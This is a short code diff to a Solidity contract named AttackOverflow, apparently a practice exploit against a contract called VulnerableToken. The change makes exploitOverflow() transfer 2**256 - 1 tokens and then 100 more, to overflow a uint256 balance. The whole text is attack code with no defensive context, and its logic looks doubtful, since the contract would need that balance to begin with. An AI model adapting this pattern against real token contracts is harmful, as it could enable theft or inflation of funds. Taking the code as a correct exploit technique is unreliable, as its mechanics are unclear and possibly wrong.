@@ -10,8 +10,11 @@ contract AttackOverflow {
         vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
     }
 
+
     // Trigger an overflow on attacker's balance
     function exploitOverflow() public {
-        vulnerableToken.transfer(msg.sender, 10); // Transfer tokens
+        // Transfer tokens to trigger overflow by exceeding the maximum uint256 value
+        vulnerableToken.transfer(msg.sender, 2**256 - 1); 
+        vulnerableToken.transfer(msg.sender, 100); 
     }
 }
